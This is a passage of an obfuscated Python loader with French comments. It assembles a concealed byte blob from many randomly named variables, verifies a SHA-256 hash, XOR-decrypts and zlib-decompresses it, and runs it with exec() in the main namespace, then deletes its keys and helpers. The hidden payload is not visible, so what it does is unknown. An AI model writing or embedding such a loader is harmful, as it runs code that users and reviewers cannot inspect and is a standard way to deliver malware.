_cseK5VURZdr_tg + _cbXNZh1mNSUEgU + _cpGdFwxNCiOAHC + _cgZnG0ijkqvkgo + _cldWuQeJxUiOZS + _ce4O110hLmVtYz + _cfAe1AZm8sSbS1 + _ccXEzKsJpDjVGe + _cjYMLNmw1FYgWL + _cuqUPSPZ0Hxgtt + _crMTswMBL9APRF + _cfz3pSbkr2vqR5 + _chJDCRxhckXXZk + _ca7LKtGfxAmXEE + _cl7DroXyZjGbK1 + _cowsA9SnvjIc7g + _criNusI977GLxN + _cseDS6yDNczZWe + _clLh9AK9MycqT0 + _ct_RolM3JUIsEd + _ciyy3tZqBeaPKS + _cmtAfNVsyqRvdu + _cpiRhz9U6sEyWo + _co0RFAp094GY1c + _ci6NBBF2vyH9tD + _cvm65va16Re2ZK + _cb9Lz9PZfFbhgv + _ckveiQEhMdSx5V + _czvqQDrF34XqTt + _cwNXiPgixDuebk + _cqgMO72YMFje4c + _cj2saNC11zyYgD + _cyWDQdSRDRNwmX + _cphE5g2WCRPFDR + _cpS_FKGrWMz4t0 + _czSV8TcNrbgvvi + _cr_N5Ac85D6Lek + _cox6nUoqm5O_Xr + _ck0Pw8XWZsxEDc + _ceebT6TgOXAPoG + _cihuFf84wIKqqv + _cq_5EsuTozepTK + _cfnKdSJHBkGvUa + _cataIwlc1RsSXk + _cqvpdrW4rMrRNG + _cmiEQ5335exf0T + _cdsrB1inWDLszW + _chuEoFHRuMcltc + _c_TdAXhjqVXtME + _cbTnGLj2Jx6DM_ + _cp59on44UvcAK0 + _cmjIOUvfVi_bH7 + _cz0yVNzw3vtp9k + _cmEUHqGLMP9wwp + _cfhNYZT8QEezeE + _chuUUWt70ABeJc + _cunK4ZIkf7rVRt + _cnw_h9dHWYcgt_ + _c_FUQoIiSYKgNs + _ciDY34GaLnB9XO + _cnV8Rnp05BR7_l + _cbUVNJd0DTD3T0 + _ctnMpw4Ai1C3ZJ + _cq2zQJ43L6sEG5)
if __import__('hashlib').sha256(_pwrED1nlIxxlvg).hexdigest() != '16d6b10d78c8adb75ca32b4df8f2714ebd845fc18ac589690296802498525996':
    __import__('sys').exit(1)
_xec3X8mb_xjJQw = bytes([161, 145, 33, 232, 152, 118, 199, 153, 36, 105, 118, 108, 162])
_fkolMS5RIKlXnIY = bytes([78, 40, 124, 156, 202, 241, 114, 163, 144, 52, 161, 235, 219])

def _fxhwsED9zojBgE_(_bneHPfJVUhJDvv, _klT2el43X_3Ttp):
    return bytes(_bneHPfJVUhJDvv[_iqBQlNLo92FYHZ] ^ _klT2el43X_3Ttp[_iqBQlNLo92FYHZ % len(_klT2el43X_3Ttp)] for _iqBQlNLo92FYHZ in range(len(_bneHPfJVUhJDvv)))

def _fde8JkoDIGCviIn(_tiyziVRGgBJxmo):
    import zlib
    return zlib.decompress(_tiyziVRGgBJxmo) # Un seul niveau de zlib ici pour simplifier

def _fe_ppRdohttsA5R():
    import sys, builtins
    # 1. Déchiffrement XOR
    _xe_xiO8VxYAe6x = _fxhwsED9zojBgE_(_pwrED1nlIxxlvg, _xec3X8mb_xjJQw)
    # 2. Décompression Zlib
    _de2QmjT1x_nzgM = _fde8JkoDIGCviIn(_xe_xiO8VxYAe6x)
    # 3. Conversion bytes -> string (C'est là la différence clé !)
    source_code = _de2QmjT1x_nzgM.decode('utf-8')
    
    # 4. Préparation de l'environnement
    _main = sys.modules['__main__']
    _nag2TL1sVqMybp = _main.__dict__
    _nag2TL1sVqMybp.setdefault('__builtins__', builtins)
    
    # 5. Exécution directe du code source
    # On compile à la volée, ce qui marche sur n'importe quelle version de Python
    try:
        exec(source_code, _nag2TL1sVqMybp)
    except Exception as e:
        print(f"Erreur fatale: {e}")
        sys.exit(1)

_fe_ppRdohttsA5R()
try:
    del _fxhwsED9zojBgE_, _fde8JkoDIGCviIn, _fe_ppRdohttsA5R
    del _pwrED1nlIxxlvg, _xec3X8mb_xjJQw, _fkolMS5RIKlXnIY
except:
    pass
